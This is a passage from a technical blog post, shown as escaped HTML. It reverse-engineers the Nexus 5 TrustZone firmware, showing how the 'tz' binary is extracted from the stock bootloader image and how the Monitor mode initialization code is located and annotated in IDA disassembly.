&lt;li&gt;SP register setup: the Monitor mode stack address is set into
SP register. This register is banked, which means this value will
be automatically restored next time the processor enters in Monitor
mode.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Exception vectors: called when
an exception is taken to Monitor mode.&lt;/h3&gt;
Both samples implement a simple Secure Monitor Call (SMC) handler
that switches between the normal and secure worlds when a SMC call
is made. As SMC handler is an entry point to the Secure state, it
would be interesting to analyze it in Nexus 5 firmware.&lt;br&gt;
&lt;h2&gt;III. Extracting Nexus 5 firmware&lt;/h2&gt;
We know that the Monitor code may be embedded into the TEE image.
In the case of Nexus 5, this image can be extracted from stock
ROM.&lt;br&gt;
Once downloaded, we use a small &lt;a href=
"https://gist.github.com/frederic/cd56923c8af46ae44fd5"&gt;tool to
unpack bootloader-hammerhead-hhz11k.img file&lt;/a&gt;. One of extracted
files is an ELF ARM binary named "tz".&lt;br&gt;
&lt;h2&gt;IV. Nexus 5 Monitor mode code&lt;/h2&gt;
To analyze the Nexus 5 TrustZone binary, we can use &lt;a href=
"https://www.hex-rays.com/products/ida/support/download_demo.shtml"&gt;
IDA Demo 6.6&lt;/a&gt;.&lt;br&gt;
Given that setting up MVBAR is very specific to the monitor mode's
initialization code, we use it to locate the Monitor mode's
initialization code in Nexus 5 TrustZone binary.&lt;br&gt;
Using IDA regex search in code disassembly, we look for the
instruction used to write MVBAR :&lt;br&gt;
&lt;blockquote class="tr_bq" style=
"background-color: white; color: black;"&gt;&lt;span style=
"color: navy; font-family: FixedSys; white-space: pre;"&gt;MCR&lt;/span&gt;[[:space:]]+&lt;span style="color: navy; font-family: FixedSys; white-space: pre;"&gt;p15,&lt;/span&gt;
&lt;span style=
"color: green; font-family: FixedSys; white-space: pre;"&gt;0&lt;/span&gt;&lt;span style="color: navy; font-family: FixedSys; white-space: pre;"&gt;,&lt;/span&gt;
[^,]+&lt;span style=
"color: navy; font-family: FixedSys; white-space: pre;"&gt;,c12,c0,&lt;/span&gt;
&lt;span style=
"color: green; font-family: FixedSys; white-space: pre;"&gt;1&lt;/span&gt;&lt;/blockquote&gt;
This search returns only 3 occurrences, and one of them also sets
the SP register. These instructions are expected to be found in
Monitor mode initialization code.&lt;br&gt;
&lt;h3&gt;IV.1. Monitor mode initialization function&lt;/h3&gt;
Here's the disassembly of the Monitor mode initialization code
:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB4C&lt;/span&gt; &lt;span class="no"&gt;init_monitor&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB4C&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;CPSR_c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xD6 ; switch to Monitor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB50&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;monitor_vector_table&lt;/span&gt; &lt;span class="c1"&gt;; load monitor vector table ptr into R0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB54&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; write R0 to MVBAR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB58&lt;/span&gt;                 &lt;span class="no"&gt;BL&lt;/span&gt;              &lt;span class="no"&gt;sub_FE80DB88&lt;/span&gt; &lt;span class="c1"&gt;; initialize Non-Secure world&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB5C&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0xFE82B700&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB60&lt;/span&gt;                 &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="c1"&gt;; write MPIDR value to R0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB64&lt;/span&gt;                 &lt;span class="no"&gt;AND&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFF ; keep Affinity level 0 : current virtual CPU id&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB68&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x200&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB6C&lt;/span&gt;                 &lt;span class="no"&gt;MUL&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt; &lt;span class="c1"&gt;; compute stack offset for current vCPU&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB70&lt;/span&gt;                 &lt;span class="no"&gt;SUB&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt; &lt;span class="c1"&gt;; setup Monitor stack register SP&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB74&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0b100&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB78&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; set FIQ flag in SCR register&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB7C&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;      &lt;span class="c1"&gt;; flush the pipeline in the processor&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB80&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;CPSR_c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xD3 ; switch to Supervisor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB84&lt;/span&gt;                 &lt;span class="no"&gt;BX&lt;/span&gt;              &lt;span class="no"&gt;LR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB84&lt;/span&gt; &lt;span class="c1"&gt;; End of function init_monitor&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;br&gt;
We will now proceed to a detailed analysis of each step.&lt;br&gt;
&lt;h5&gt;IV.1.A Switch to Monitor mode&lt;/h5&gt;
MSR instruction moves an immediate value (here 0xD6) to a Special
register (here CPSR_c).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB4C&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;CPSR_c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xD6 ; switch to Monitor mode&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The Current Program Status Register (CPSR) holds processor status
and control information. CPSR with "_c" suffix enables writing of
bits&amp;lt;0:7&amp;gt; of CPSR (&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;ARM
Ref.&lt;/a&gt; B9.3.11). This bitfield controls the processor mode and
exception masks.&lt;/p&gt;
&lt;p&gt;We can use a simple IDAPython script to replace the immediate value
0xD6 with symbols documented in &lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;
ARM Ref.&lt;/a&gt; (B1-1148) :&lt;br&gt;
&lt;script src=
"https://gist.github.com/frederic/251c453abc3c520a94be.js"&gt;
&lt;/script&gt;Thus, the instruction becomes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB4C&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;CPSR_c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#CPSR_MODE_MON OR CPSR_MASK_FIQ OR CPSR_MASK_IRQ ; switch to Monitor mode&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This instruction switches the processor to Monitor mode. It also
sets CPSR.F and CPSR.I bits to mask FIQ and IRQ exceptions, meaning
they cannot be taken.
&lt;h5&gt;IV.1.B Setup MVBAR&lt;/h5&gt;
The Move to Coprocessor from ARM core register instruction (MCR)
passes the value of an ARM core register (here R0) to a coprocessor
(here CP15).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB50&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;monitor_vector_table&lt;/span&gt; &lt;span class="c1"&gt;; load monitor vector table ptr into R0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB54&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; write R0 to MVBAR&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;CP15 c12 register is present on an ARMv7-A implementation that
includes Security Extensions. This instruction writes R0 value to
MVBAR. R0 contains a pointer to Monitor vector table. We will
describe this table later.
&lt;h5&gt;IV.1.C Initialize Non-Secure world&lt;/h5&gt;
The function&amp;nbsp;sub_FE80DB88 is called to initialize the
Non-Secure world context:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB88&lt;/span&gt; &lt;span class="no"&gt;sub_FE80DB88&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB88&lt;/span&gt;                &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; read Secure SCTLR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB8C&lt;/span&gt;               &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#SCR_NS OR SCR_FW OR SCR_AW ; #0x31&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB90&lt;/span&gt;                &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; switch to Non-Secure (NS) state&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB94&lt;/span&gt;                &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB98&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write Secure SCTLR value to NS SCTLR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DB9C&lt;/span&gt;               &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBA0&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear CSSELR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBA4&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear TTBR0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBA8&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear TTBR1&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBAC&lt;/span&gt;              &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="c1"&gt;; clear TTBCR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBB0&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear DACR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBB4&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear DFSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBB8&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear IFSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBBC&lt;/span&gt;               &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear ADFSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBC0&lt;/span&gt;              &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear AIFSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBC4&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear DFAR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBC8&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="c1"&gt;; clear IFAR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBCC&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear PAR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBD0&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear PRRR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBD4&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="c1"&gt;; clear NMRR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80DBD8&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; clear &amp;quot;MMUDMTR&amp;quot; ?&lt;/span&gt;
